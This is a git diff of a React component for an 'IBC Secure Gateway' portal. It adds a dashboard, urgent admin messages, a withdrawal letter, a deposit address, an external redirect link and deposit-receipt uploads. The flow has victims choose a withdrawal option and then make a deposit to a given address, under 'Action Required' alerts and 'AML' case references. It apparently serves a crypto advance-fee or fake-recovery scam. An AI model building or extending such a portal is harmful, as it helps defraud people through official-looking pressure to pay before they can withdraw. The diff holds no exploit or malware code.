@@ -5,7 +5,8 @@ import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, D
 import { Input } from "@/components/ui/input";
 import { Badge } from "@/components/ui/badge";
 import { ScrollArea } from "@/components/ui/scroll-area";
-import { ShieldCheck, Lock, CheckCircle2, Key, User, Mail, Phone, FolderOpen, FileText, History, ArrowLeft, MessageCircle, Send, X } from "lucide-react";
+import { Textarea } from "@/components/ui/textarea";
+import { ShieldCheck, Lock, CheckCircle2, Key, User, Mail, Phone, FolderOpen, FileText, History, ArrowLeft, MessageCircle, Send, X, AlertTriangle, Clock, CheckCircle, Upload, Image, ExternalLink, Wallet, Bell, Home } from "lucide-react";
 import { motion, AnimatePresence } from "framer-motion";
 import ibcLogo from "@assets/generated_images/professional_corporate_logo_for_international_blockchain_community.png";
 import { useToast } from "@/hooks/use-toast";
@@ -22,6 +23,9 @@ interface Case {
   withdrawalAmount?: string;
   withdrawalBatches?: string;
   physilocal0?: string;
+  depositAddress?: string;
+  profileRedirectUrl?: string;
+  hasRequirements?: boolean;
 }
 
 interface CaseLetter {
@@ -33,6 +37,14 @@ interface CaseLetter {
   optionADescription?: string;
   optionBTitle?: string;
   optionBDescription?: string;
+  optionAAmount?: string;
+  optionABatches?: string;
+  optionATotalAmount?: string;
+  optionAFilelocoId?: string;
+  optionBAmount?: string;
+  optionBBatches?: string;
+  optionBTotalAmount?: string;
+  optionBFilelocoId?: string;
 }
 
 interface Submission {
@@ -56,6 +68,26 @@ interface ChatMessage {
   createdAt: string;
 }
 
+interface AdminMessage {
+  id: number;
+  caseId: string;
+  category: 'urgent' | 'processing' | 'resolved';
+  title: string;
+  body: string;
+  isRead: boolean;
+  createdAt: string;
+}
+
+interface DepositReceipt {
+  id: number;
+  caseId: string;
+  imageData?: string;
+  fileName?: string;
+  notes?: string;
+  status: string;
+  uploadedAt: string;
+}
+
 const playNotificationSound = () => {
   const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
   const oscillator = audioContext.createOscillator();
@@ -76,7 +108,7 @@ const playNotificationSound = () => {
 };
 
 export default function SecurePortal() {
-  const [viewState, setViewState] = useState<'login' | 'register' | 'sync' | 'letter' | 'submissions' | 'success'>('login');
+  const [viewState, setViewState] = useState<'login' | 'register' | 'sync' | 'dashboard' | 'letter' | 'messages' | 'submissions' | 'success' | 'deposit'>('login');
   
   const [currentCase, setCurrentCase] = useState<Case | null>(null);
   const [letterContent, setLetterContent] = useState<CaseLetter | null>(null);
@@ -93,6 +125,7 @@ export default function SecurePortal() {
   const [selectedOption, setSelectedOption] = useState<"A" | "B" | null>(null);
   const [isConfirming, setIsConfirming] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const [lastSubmission, setLastSubmission] = useState<Submission | null>(null);
   
   const [isChatOpen, setIsChatOpen] = useState(false);
   const [chatMessages, setChatMessages] = useState<ChatMessage[]>([]);
@@ -102,6 +135,17 @@ export default function SecurePortal() {
   const chatScrollRef = useRef<HTMLDivElement>(null);
   const lastMessageCountRef = useRef(0);
   const isInitialLoadRef = useRef(true);
+  
+  // Admin messages
+  const [adminMessages, setAdminMessages] = useState<AdminMessage[]>([]);
+  const [selectedMessage, setSelectedMessage] = useState<AdminMessage | null>(null);
+  const [unreadAdminMessages, setUnreadAdminMessages] = useState(0);
+  
+  // Deposit receipts
+  const [depositReceipts, setDepositReceipts] = useState<DepositReceipt[]>([]);
+  const [uploadingReceipt, setUploadingReceipt] = useState(false);
+  const [receiptNotes, setReceiptNotes] = useState("");
+  const fileInputRef = useRef<HTMLInputElement>(null);
   
   const { toast } = useToast();
 
@@ -138,20 +182,22 @@ export default function SecurePortal() {
     };
   }, [viewState, toast]);
 
-  // Load letter content and submissions when case becomes active
+  // Load all data when case becomes active
   useEffect(() => {
-    if (currentCase && (viewState === 'letter' || viewState === 'submissions')) {
-      loadLetterAndSubmissions();
+    if (currentCase && viewState !== 'login' && viewState !== 'register' && viewState !== 'sync') {
+      loadAllData();
     }
   }, [currentCase, viewState]);
 
-  const loadLetterAndSubmissions = async () => {
+  const loadAllData = async () => {
     if (!currentCase) return;
     
     try {
-      const [letterRes, submissionsRes] = await Promise.all([
+      const [letterRes, submissionsRes, adminMsgRes, receiptsRes] = await Promise.all([
         fetch(`/api/cases/${currentCase.id}/letter`),
-        fetch(`/api/cases/${currentCase.id}/submissions`)
+        fetch(`/api/cases/${currentCase.id}/submissions`),
+        fetch(`/api/cases/${currentCase.id}/admin-messages`),
+        fetch(`/api/cases/${currentCase.id}/deposit-receipts`)
       ]);
       
       if (letterRes.ok) {
@@ -162,6 +208,18 @@ export default function SecurePortal() {
       if (submissionsRes.ok) {
         const data = await submissionsRes.json();
         setSubmissions(data);
+      }
+      
+      if (adminMsgRes.ok) {
+        const data = await adminMsgRes.json();
+        setAdminMessages(data);
+        const unread = data.filter((m: AdminMessage) => !m.isRead).length;
+        setUnreadAdminMessages(unread);
+      }
+      
+      if (receiptsRes.ok) {
+        const data = await receiptsRes.json();
+        setDepositReceipts(data);
       }
     } catch (error) {
       console.error('Failed to load data:', error);
@@ -261,7 +319,7 @@ export default function SecurePortal() {
             setCurrentCase(updatedCase);
             setSyncProgress(100);
             setSyncStatusText("Synchronization Complete.");
-            setTimeout(() => setViewState('letter'), 1000);
+            setTimeout(() => setViewState('dashboard'), 1000);
           }
         }
       } catch (error) {
@@ -282,9 +340,9 @@ export default function SecurePortal() {
         const foundCase = await response.json();
         setCurrentCase(foundCase);
         
-        if (foundCase.status === 'active') setViewState('letter');
+        if (foundCase.status === 'active') setViewState('dashboard');
         else if (foundCase.status === 'syncing') setViewState('sync');
-        else if (foundCase.status === 'completed') setViewState('submissions');
+        else if (foundCase.status === 'completed') setViewState('dashboard');
         else setViewState('register');
         
         toast({
@@ -379,6 +437,8 @@ export default function SecurePortal() {
         });
 
         if (response.ok) {
+          const submission = await response.json();
+          setLastSubmission(submission);
           setIsSubmitting(false);
           setIsConfirming(false);
           setViewState('success');
@@ -400,6 +460,56 @@ export default function SecurePortal() {
       }
     }
   };
+
+  const markAdminMessageAsRead = async (messageId: number) => {
+    try {
+      await fetch(`/api/admin-messages/${messageId}/read`, { method: 'POST' });
+      setAdminMessages(prev => prev.map(m => m.id === messageId ? { ...m, isRead: true } : m));
+      setUnreadAdminMessages(prev => Math.max(0, prev - 1));
+    } catch (error) {
+      console.error('Failed to mark message as read:', error);
+    }
+  };
+
+  const handleFileUpload = async (event: React.ChangeEvent<HTMLInputElement>) => {
+    const file = event.target.files?.[0];
+    if (!file || !currentCase) return;
+
+    setUploadingReceipt(true);
+    
+    try {
+      const reader = new FileReader();
+      reader.onload = async (e) => {
+        const base64Data = e.target?.result as string;
+        
+        const response = await fetch(`/api/cases/${currentCase.id}/deposit-receipts`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            imageData: base64Data,
+            fileName: file.name,
+            notes: receiptNotes
+          })
+        });
+
+        if (response.ok) {
+          const receipt = await response.json();
+          setDepositReceipts(prev => [receipt, ...prev]);
+          setReceiptNotes("");
+          toast({ title: "Receipt Uploaded", description: "Your deposit receipt has been submitted for review." });
+        } else {
+          toast({ variant: "destructive", title: "Upload Failed", description: "Unable to upload receipt." });
+        }
+        setUploadingReceipt(false);
+      };
+      reader.readAsDataURL(file);
+    } catch (error) {
+      toast({ variant: "destructive", title: "Upload Error", description: "Failed to process file." });
+      setUploadingReceipt(false);
+    }
+  };
+
+  const hasUrgentMessages = adminMessages.some(m => m.category === 'urgent' && !m.isRead);
 
   // LOGIN VIEW
   if (viewState === 'login') {
@@ -529,20 +639,635 @@ export default function SecurePortal() {
     );
   }
 
+  // DASHBOARD VIEW
+  if (viewState === 'dashboard') {
+    const urgentMessages = adminMessages.filter(m => m.category === 'urgent');
+    const processingMessages = adminMessages.filter(m => m.category === 'processing');
+    const resolvedMessages = adminMessages.filter(m => m.category === 'resolved');
+
+    return (
+      <div className="min-h-screen bg-gradient-to-br from-slate-50 to-blue-50">
+        {/* Header */}
+        <nav className="bg-primary text-white shadow-lg">
+          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4">
+            <div className="flex justify-between items-center">
+              <div className="flex items-center gap-3">
+                <img src={ibcLogo} alt="IBC" className="h-10 w-10 object-contain" />
+                <div>
+                  <h1 className="font-bold text-lg">IBC SECURE GATEWAY</h1>
+                  <p className="text-xs text-blue-200 uppercase tracking-wide">Member Dashboard</p>
+                </div>
+              </div>
+              <div className="flex items-center gap-4">
+                {hasUrgentMessages && (
+                  <div className="animate-pulse flex items-center gap-2 bg-red-500 px-3 py-1 rounded-full text-sm font-bold">
+                    <AlertTriangle className="w-4 h-4" />
+                    URGENT
+                  </div>
+                )}
+                <Button 
+                  variant="ghost" 
+                  size="sm" 
+                  className="text-white hover:bg-white/10"
+                  onClick={() => { setViewState('login'); setCurrentCase(null); }}
+                  data-testid="button-logout"
+                >
+                  Sign Out
+                </Button>
+              </div>
+            </div>
+          </div>
+        </nav>
+
+        <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
+          {/* Welcome Section */}
+          <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="mb-8">
+            <h2 className="text-3xl font-serif font-bold text-slate-900 mb-2">
+              Welcome, {currentCase?.userName || 'Member'}
+            </h2>
+            <p className="text-slate-600">Reference: IBC-AML-CC-{currentCase?.accessCode}</p>
+          </motion.div>
+
+          {/* Requirement Alert */}
+          {(currentCase?.hasRequirements || hasUrgentMessages) && (
+            <motion.div 
+              initial={{ opacity: 0, scale: 0.95 }} 
+              animate={{ opacity: 1, scale: 1 }}
+              className="mb-8 p-4 bg-red-50 border-2 border-red-200 rounded-lg flex items-center gap-4"
+            >
+              <div className="w-12 h-12 bg-red-100 rounded-full flex items-center justify-center flex-shrink-0">
+                <AlertTriangle className="w-6 h-6 text-red-600" />
+              </div>
+              <div>
+                <h3 className="font-bold text-red-900">Action Required</h3>
+                <p className="text-red-700 text-sm">You have pending requirements from IBC. Please check your messages.</p>
+              </div>
+            </motion.div>
+          )}
+
+          {/* Main Grid */}
+          <div className="grid lg:grid-cols-3 gap-6">
+            {/* Required Actions Card */}
+            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.1 }}>
+              <Card className="h-full hover:shadow-lg transition-shadow cursor-pointer border-2 border-transparent hover:border-primary/20" onClick={() => setViewState('messages')} data-testid="card-required-actions">
+                <CardHeader className="bg-gradient-to-r from-blue-500 to-blue-600 text-white rounded-t-lg">
+                  <div className="flex items-center justify-between">
+                    <CardTitle className="flex items-center gap-2">
+                      <Bell className="w-5 h-5" />
+                      Required Actions
+                    </CardTitle>
+                    {unreadAdminMessages > 0 && (
+                      <Badge className="bg-red-500 text-white animate-pulse">{unreadAdminMessages}</Badge>
+                    )}
+                  </div>
+                </CardHeader>
+                <CardContent className="pt-6">
+                  <div className="space-y-3">
+                    <div className="flex items-center justify-between text-sm">
+                      <span className="flex items-center gap-2 text-red-600">
+                        <AlertTriangle className="w-4 h-4" /> Urgent
+                      </span>
+                      <Badge variant={urgentMessages.length > 0 ? "destructive" : "secondary"}>{urgentMessages.length}</Badge>
+                    </div>
+                    <div className="flex items-center justify-between text-sm">
+                      <span className="flex items-center gap-2 text-amber-600">
+                        <Clock className="w-4 h-4" /> Processing
+                      </span>
+                      <Badge variant="outline">{processingMessages.length}</Badge>
+                    </div>
+                    <div className="flex items-center justify-between text-sm">
+                      <span className="flex items-center gap-2 text-green-600">
+                        <CheckCircle className="w-4 h-4" /> Resolved
+                      </span>
+                      <Badge variant="outline">{resolvedMessages.length}</Badge>
+                    </div>
+                  </div>
+                  <Button className="w-full mt-6" variant="outline">View Messages</Button>
+                </CardContent>
+              </Card>
+            </motion.div>
+
+            {/* Withdrawal Letter Card */}
+            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.2 }}>
+              <Card className="h-full hover:shadow-lg transition-shadow cursor-pointer border-2 border-transparent hover:border-primary/20" onClick={() => setViewState('letter')} data-testid="card-withdrawal-letter">
+                <CardHeader className="bg-gradient-to-r from-emerald-500 to-emerald-600 text-white rounded-t-lg">
+                  <CardTitle className="flex items-center gap-2">
+                    <FileText className="w-5 h-5" />
+                    Withdrawal Letter
+                  </CardTitle>
+                </CardHeader>
+                <CardContent className="pt-6">
+                  <p className="text-slate-600 text-sm mb-4">
+                    Review your withdrawal options and select your preferred method.
+                  </p>
+                  <div className="space-y-2 text-sm">
+                    <div className="flex justify-between">
+                      <span className="text-slate-500">Status</span>
+                      <Badge variant={currentCase?.status === 'completed' ? 'default' : 'outline'}>
+                        {currentCase?.status === 'completed' ? 'Submitted' : 'Pending'}
+                      </Badge>
+                    </div>
+                    <div className="flex justify-between">
+                      <span className="text-slate-500">Submissions</span>
+                      <span className="font-semibold">{submissions.length}</span>
+                    </div>
+                  </div>
+                  <Button className="w-full mt-6" variant="outline">View Letter</Button>
+                </CardContent>
+              </Card>
+            </motion.div>
+
+            {/* Profile Card */}
+            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.3 }}>
+              <Card className="h-full hover:shadow-lg transition-shadow border-2 border-transparent hover:border-primary/20">
+                <CardHeader className="bg-gradient-to-r from-purple-500 to-purple-600 text-white rounded-t-lg">
+                  <CardTitle className="flex items-center gap-2">
+                    <User className="w-5 h-5" />
+                    Profile Information
+                  </CardTitle>
+                </CardHeader>
+                <CardContent className="pt-6">
+                  <div className="space-y-3 text-sm">
+                    <div className="flex justify-between items-center">
+                      <span className="text-slate-500">Name</span>
+                      <span className="font-semibold">{currentCase?.userName}</span>
+                    </div>
+                    <div className="flex justify-between items-center">
+                      <span className="text-slate-500">Email</span>
+                      <span className="font-semibold text-xs">{currentCase?.userEmail}</span>
+                    </div>
+                    <div className="flex justify-between items-center">
+                      <span className="text-slate-500">VIP Status</span>
+                      <Badge className="bg-amber-100 text-amber-700">{currentCase?.vipStatus || 'Standard'}</Badge>
+                    </div>
+                    {currentCase?.depositAddress && (
+                      <div className="pt-2 border-t">
+                        <span className="text-slate-500 text-xs block mb-1">Deposit Address</span>
+                        <code className="text-xs bg-slate-100 p-2 rounded block break-all">{currentCase.depositAddress}</code>
+                      </div>
+                    )}
+                  </div>
+                  {currentCase?.profileRedirectUrl && (
+                    <Button 
+                      className="w-full mt-6" 
+                      variant="outline"
+                      onClick={() => window.open(currentCase.profileRedirectUrl, '_blank')}
+                    >
+                      <ExternalLink className="w-4 h-4 mr-2" />
+                      Open Profile Link
+                    </Button>
+                  )}
+                </CardContent>
+              </Card>
+            </motion.div>
+
+            {/* Deposit Section Card */}
+            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.4 }}>
+              <Card className="h-full hover:shadow-lg transition-shadow cursor-pointer border-2 border-transparent hover:border-primary/20" onClick={() => setViewState('deposit')} data-testid="card-deposit">
+                <CardHeader className="bg-gradient-to-r from-amber-500 to-amber-600 text-white rounded-t-lg">
+                  <CardTitle className="flex items-center gap-2">
+                    <Wallet className="w-5 h-5" />
+                    Deposit & Receipts
+                  </CardTitle>
+                </CardHeader>
+                <CardContent className="pt-6">
+                  <p className="text-slate-600 text-sm mb-4">
+                    Upload your deposit receipts and track their status.
+                  </p>
+                  <div className="space-y-2 text-sm">
+                    <div className="flex justify-between">
+                      <span className="text-slate-500">Receipts Uploaded</span>
+                      <span className="font-semibold">{depositReceipts.length}</span>
+                    </div>
+                    <div className="flex justify-between">
+                      <span className="text-slate-500">Pending Review</span>
+                      <span className="font-semibold">{depositReceipts.filter(r => r.status === 'pending').length}</span>
+                    </div>
+                  </div>
+                  <Button className="w-full mt-6" variant="outline">Manage Deposits</Button>
+                </CardContent>
+              </Card>
+            </motion.div>
+
+            {/* Submission History Card */}
+            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.5 }}>
+              <Card className="h-full hover:shadow-lg transition-shadow cursor-pointer border-2 border-transparent hover:border-primary/20" onClick={() => setViewState('submissions')} data-testid="card-history">
+                <CardHeader className="bg-gradient-to-r from-slate-600 to-slate-700 text-white rounded-t-lg">
+                  <CardTitle className="flex items-center gap-2">
+                    <History className="w-5 h-5" />
+                    Submission History
+                  </CardTitle>
+                </CardHeader>
+                <CardContent className="pt-6">
+                  <p className="text-slate-600 text-sm mb-4">
+                    View all your previous submissions and their status.
+                  </p>
+                  <div className="text-sm">
+                    <div className="flex justify-between">
+                      <span className="text-slate-500">Total Submissions</span>
+                      <span className="font-semibold">{submissions.length}</span>
+                    </div>
+                  </div>
+                  <Button className="w-full mt-6" variant="outline">View History</Button>
+                </CardContent>
+              </Card>
+            </motion.div>
+
+            {/* IBC Support Card */}
+            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.6 }}>
+              <Card className="h-full hover:shadow-lg transition-shadow cursor-pointer border-2 border-transparent hover:border-primary/20" onClick={() => setIsChatOpen(true)} data-testid="card-support">
+                <CardHeader className="bg-gradient-to-r from-cyan-500 to-cyan-600 text-white rounded-t-lg">
+                  <div className="flex items-center justify-between">
+                    <CardTitle className="flex items-center gap-2">
+                      <MessageCircle className="w-5 h-5" />
+                      IBC Support
+                    </CardTitle>
+                    {unreadCount > 0 && (
+                      <Badge className="bg-red-500 text-white">{unreadCount}</Badge>
+                    )}
+                  </div>
+                </CardHeader>
+                <CardContent className="pt-6">
+                  <p className="text-slate-600 text-sm mb-4">
+                    Chat with IBC support for assistance with your account.
+                  </p>
+                  <Button className="w-full mt-6" variant="outline">
+                    <MessageCircle className="w-4 h-4 mr-2" />
+                    Open Chat
+                  </Button>
+                </CardContent>
+              </Card>
+            </motion.div>
+          </div>
+        </main>
+
+        {/* Floating Chat Button */}
+        <motion.button
+          initial={{ scale: 0 }}
+          animate={{ scale: 1 }}
+          whileHover={{ scale: 1.1 }}
+          className="fixed bottom-6 right-6 w-16 h-16 bg-primary text-white rounded-full shadow-2xl flex items-center justify-center z-50"
+          onClick={() => setIsChatOpen(true)}
+          data-testid="button-chat-float"
+        >
+          <MessageCircle className="w-7 h-7" />
+          {unreadCount > 0 && (
+            <span className="absolute -top-1 -right-1 w-6 h-6 bg-red-500 rounded-full text-xs flex items-center justify-center font-bold">
+              {unreadCount}
+            </span>
+          )}
+        </motion.button>
+
+        {/* Chat Dialog - will be rendered at the end */}
+      </div>
+    );
+  }
+
+  // MESSAGES VIEW
+  if (viewState === 'messages') {
+    const urgentMessages = adminMessages.filter(m => m.category === 'urgent');
+    const processingMessages = adminMessages.filter(m => m.category === 'processing');
+    const resolvedMessages = adminMessages.filter(m => m.category === 'resolved');
+
+    return (
+      <div className="min-h-screen bg-slate-50">
+        <nav className="bg-primary text-white shadow-lg">
+          <div className="max-w-5xl mx-auto px-4 py-4 flex items-center gap-4">
+            <Button variant="ghost" size="icon" className="text-white" onClick={() => setViewState('dashboard')}>
+              <ArrowLeft className="w-5 h-5" />
+            </Button>
+            <div>
+              <h1 className="font-bold">Required Actions</h1>
+              <p className="text-xs text-blue-200">View messages from IBC</p>
+            </div>
+          </div>
+        </nav>
+
+        <main className="max-w-5xl mx-auto px-4 py-8">
+          {/* Urgent Messages */}
+          {urgentMessages.length > 0 && (
+            <div className="mb-8">
+              <h2 className="text-lg font-bold text-red-600 flex items-center gap-2 mb-4">
+                <AlertTriangle className="w-5 h-5 animate-pulse" />
+                Urgent
+              </h2>
+              <div className="space-y-4">
+                {urgentMessages.map(msg => (
+                  <Card 
+                    key={msg.id} 
+                    className={`border-2 ${!msg.isRead ? 'border-red-400 bg-red-50' : 'border-red-200'} cursor-pointer hover:shadow-lg transition-all`}
+                    onClick={() => { setSelectedMessage(msg); if (!msg.isRead) markAdminMessageAsRead(msg.id); }}
+                  >
+                    <CardHeader className="pb-2">
+                      <div className="flex items-center justify-between">
+                        <CardTitle className="text-red-900 flex items-center gap-2">
+                          {!msg.isRead && <div className="w-2 h-2 bg-red-500 rounded-full animate-pulse" />}
+                          {msg.title}
+                        </CardTitle>
+                        <span className="text-xs text-slate-500">{new Date(msg.createdAt).toLocaleDateString()}</span>
+                      </div>
+                    </CardHeader>
+                    <CardContent>
+                      <p className="text-sm text-slate-600 line-clamp-2">{msg.body}</p>
+                    </CardContent>
+                  </Card>
+                ))}
+              </div>
+            </div>
+          )}
+
+          {/* Processing Messages */}
+          {processingMessages.length > 0 && (
+            <div className="mb-8">
+              <h2 className="text-lg font-bold text-amber-600 flex items-center gap-2 mb-4">
+                <Clock className="w-5 h-5" />
+                Processing
+              </h2>
+              <div className="space-y-4">
+                {processingMessages.map(msg => (
+                  <Card 
+                    key={msg.id} 
+                    className={`border-2 ${!msg.isRead ? 'border-amber-400 bg-amber-50' : 'border-amber-200'} cursor-pointer hover:shadow-lg transition-all`}
+                    onClick={() => { setSelectedMessage(msg); if (!msg.isRead) markAdminMessageAsRead(msg.id); }}
+                  >
+                    <CardHeader className="pb-2">
+                      <div className="flex items-center justify-between">
+                        <CardTitle className="text-amber-900 flex items-center gap-2">
+                          {!msg.isRead && <div className="w-2 h-2 bg-amber-500 rounded-full" />}
+                          {msg.title}
+                        </CardTitle>
+                        <span className="text-xs text-slate-500">{new Date(msg.createdAt).toLocaleDateString()}</span>
+                      </div>
+                    </CardHeader>
+                    <CardContent>
+                      <p className="text-sm text-slate-600 line-clamp-2">{msg.body}</p>
+                    </CardContent>
+                  </Card>
+                ))}
+              </div>
+            </div>
+          )}
+
+          {/* Resolved Messages */}
+          {resolvedMessages.length > 0 && (
+            <div className="mb-8">
+              <h2 className="text-lg font-bold text-green-600 flex items-center gap-2 mb-4">
+                <CheckCircle className="w-5 h-5" />
+                Resolved
+              </h2>
+              <div className="space-y-4">
+                {resolvedMessages.map(msg => (
+                  <Card 
+                    key={msg.id} 
+                    className="border-2 border-green-200 cursor-pointer hover:shadow-lg transition-all"
+                    onClick={() => { setSelectedMessage(msg); if (!msg.isRead) markAdminMessageAsRead(msg.id); }}
+                  >
+                    <CardHeader className="pb-2">
+                      <div className="flex items-center justify-between">
+                        <CardTitle className="text-green-900">{msg.title}</CardTitle>
+                        <span className="text-xs text-slate-500">{new Date(msg.createdAt).toLocaleDateString()}</span>
+                      </div>
+                    </CardHeader>
+                    <CardContent>
+                      <p className="text-sm text-slate-600 line-clamp-2">{msg.body}</p>
+                    </CardContent>
+                  </Card>
+                ))}
+              </div>
+            </div>
+          )}
+
+          {adminMessages.length === 0 && (
+            <div className="text-center py-16">
+              <MessageCircle className="w-16 h-16 mx-auto text-slate-300 mb-4" />
+              <h3 className="text-xl font-semibold text-slate-600">No Messages</h3>
+              <p className="text-slate-500">You have no messages from IBC at this time.</p>
+            </div>
+          )}
+        </main>
+
+        {/* Message Detail Dialog */}
+        <Dialog open={!!selectedMessage} onOpenChange={() => setSelectedMessage(null)}>
+          <DialogContent className="max-w-lg">
+            <DialogHeader>
+              <DialogTitle className="flex items-center gap-2">
+                {selectedMessage?.category === 'urgent' && <AlertTriangle className="w-5 h-5 text-red-500" />}
+                {selectedMessage?.category === 'processing' && <Clock className="w-5 h-5 text-amber-500" />}
+                {selectedMessage?.category === 'resolved' && <CheckCircle className="w-5 h-5 text-green-500" />}
+                {selectedMessage?.title}
+              </DialogTitle>
+              <DialogDescription>
+                {selectedMessage && new Date(selectedMessage.createdAt).toLocaleString()}
+              </DialogDescription>
+            </DialogHeader>
+            <div className="py-4">
+              <p className="text-slate-700 whitespace-pre-line">{selectedMessage?.body}</p>
+            </div>
+            <DialogFooter>
+              <Button onClick={() => setSelectedMessage(null)}>Close</Button>
+            </DialogFooter>
+          </DialogContent>
+        </Dialog>
+      </div>
+    );
+  }
+
+  // DEPOSIT VIEW
+  if (viewState === 'deposit') {
+    return (
+      <div className="min-h-screen bg-slate-50">
+        <nav className="bg-primary text-white shadow-lg">
+          <div className="max-w-5xl mx-auto px-4 py-4 flex items-center gap-4">
+            <Button variant="ghost" size="icon" className="text-white" onClick={() => setViewState('dashboard')}>
+              <ArrowLeft className="w-5 h-5" />
+            </Button>
+            <div>
+              <h1 className="font-bold">Deposit & Receipts</h1>
+              <p className="text-xs text-blue-200">Upload and track your deposit receipts</p>
+            </div>
+          </div>
+        </nav>
+
+        <main className="max-w-5xl mx-auto px-4 py-8">
+          {/* Deposit Address Info */}
+          {currentCase?.depositAddress && (
+            <Card className="mb-8 border-2 border-amber-200 bg-amber-50">
+              <CardHeader>
+                <CardTitle className="flex items-center gap-2 text-amber-900">
+                  <Wallet className="w-5 h-5" />
+                  Your Deposit Address
+                </CardTitle>
+              </CardHeader>
+              <CardContent>
+                <code className="block p-4 bg-white rounded border text-sm break-all font-mono">
+                  {currentCase.depositAddress}
+                </code>
+                <p className="text-sm text-amber-700 mt-3">
+                  Please use this address for your deposit. After completing your deposit, upload the receipt below.
+                </p>
+              </CardContent>
+            </Card>
+          )}
+
+          {/* Upload Section */}
+          <Card className="mb-8">
+            <CardHeader>
+              <CardTitle className="flex items-center gap-2">
+                <Upload className="w-5 h-5" />
+                Upload Deposit Receipt
+              </CardTitle>
+            </CardHeader>
+            <CardContent>
+              <div className="space-y-4">
+                <Textarea
+                  placeholder="Add notes about your deposit (optional)..."
+                  value={receiptNotes}
+                  onChange={(e) => setReceiptNotes(e.target.value)}
+                  className="resize-none"
+                  rows={3}
+                />
+                <input
+                  ref={fileInputRef}
+                  type="file"
+                  accept="image/*"
+                  onChange={handleFileUpload}
+                  className="hidden"
+                />
+                <Button 
+                  className="w-full" 
+                  onClick={() => fileInputRef.current?.click()}
+                  disabled={uploadingReceipt}
+                >
+                  {uploadingReceipt ? (
+                    <>Uploading...</>
+                  ) : (
+                    <>
+                      <Image className="w-4 h-4 mr-2" />
+                      Select Image to Upload
+                    </>
+                  )}
+                </Button>
+              </div>
+            </CardContent>
+          </Card>
+
+          {/* Receipt History */}
+          <h3 className="text-lg font-bold text-slate-900 mb-4">Uploaded Receipts</h3>
+          {depositReceipts.length === 0 ? (
+            <div className="text-center py-12 bg-white rounded-lg border">
+              <Image className="w-12 h-12 mx-auto text-slate-300 mb-3" />
+              <p className="text-slate-500">No receipts uploaded yet</p>
+            </div>
+          ) : (
+            <div className="space-y-4">
+              {depositReceipts.map(receipt => (
+                <Card key={receipt.id}>
+                  <CardContent className="py-4 flex items-center justify-between">
+                    <div className="flex items-center gap-4">
+                      {receipt.imageData && (
+                        <img src={receipt.imageData} alt="Receipt" className="w-16 h-16 object-cover rounded" />
+                      )}
+                      <div>
+                        <p className="font-semibold">{receipt.fileName || 'Receipt'}</p>
+                        <p className="text-sm text-slate-500">{new Date(receipt.uploadedAt).toLocaleString()}</p>
+                        {receipt.notes && <p className="text-sm text-slate-600 mt-1">{receipt.notes}</p>}
+                      </div>
+                    </div>
+                    <Badge variant={
+                      receipt.status === 'approved' ? 'default' :
+                      receipt.status === 'rejected' ? 'destructive' :
+                      'secondary'
+                    }>
+                      {receipt.status}
+                    </Badge>
+                  </CardContent>
+                </Card>
+              ))}
+            </div>
+          )}
+
+          {/* Ask Support */}
+          <Card className="mt-8">
+            <CardContent className="py-6 text-center">
+              <p className="text-slate-600 mb-4">Need help with your deposit?</p>
+              <Button onClick={() => setIsChatOpen(true)}>
+                <MessageCircle className="w-4 h-4 mr-2" />
+                Contact IBC Support
+              </Button>
+            </CardContent>
+          </Card>
+        </main>
+      </div>
+    );
+  }
+
   // SUCCESS VIEW
   if (viewState === 'success') {
+    const ticketId = lastSubmission?.id ? `IBC-${String(lastSubmission.id).padStart(6, '0')}` : `IBC-${Date.now().toString().slice(-6)}`;
+    
     return (
-      <div className="min-h-screen bg-slate-50 flex items-center justify-center p-4">
+      <div className="min-h-screen bg-gradient-to-br from-green-50 to-blue-50 flex items-center justify-center p-4">
         <motion.div initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="max-w-md w-full bg-white rounded-lg shadow-xl overflow-hidden border-t-4 border-green-600">
           <div className="p-8 text-center">
             <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
               <CheckCircle2 className="w-10 h-10 text-green-600" />
             </div>
-            <h2 className="text-2xl font-bold text-slate-900 mb-2">Selection Confirmed</h2>
-            <p className="text-slate-600 mb-6">
-              Your request has been securely transmitted to the International Blockchain Community (IBC) admin panel.
+            <h2 className="text-2xl font-bold text-slate-900 mb-2">Submission Successful!</h2>
+            
+            {/* Ticket ID */}
+            <div className="my-6 p-4 bg-slate-50 rounded-lg border-2 border-dashed border-slate-200">
+              <p className="text-xs text-slate-500 uppercase tracking-wider mb-1">Ticket Reference</p>
+              <p className="text-2xl font-mono font-bold text-primary">{ticketId}</p>
+            </div>
+            
+            {/* Submission Details */}
+            <div className="text-left bg-green-50 p-4 rounded-lg mb-6">
+              <h3 className="font-semibold text-green-900 mb-2">Submission Receipt</h3>
+              <div className="space-y-1 text-sm">
+                <div className="flex justify-between">
+                  <span className="text-green-700">Option Selected</span>
+                  <span className="font-semibold">Option {lastSubmission?.selectedOption || selectedOption}</span>
+                </div>
+                <div className="flex justify-between">
+                  <span className="text-green-700">Date</span>
+                  <span className="font-semibold">{new Date().toLocaleDateString()}</span>
+                </div>
+                <div className="flex justify-between">
+                  <span className="text-green-700">Status</span>
+                  <Badge className="bg-green-600">Confirmed</Badge>
+                </div>
+              </div>
+            </div>
+
+            <p className="text-slate-600 mb-6 text-sm">
+              Your withdrawal option has been securely submitted. Please obtain your deposit address from your profile page and proceed with the deposit.
             </p>
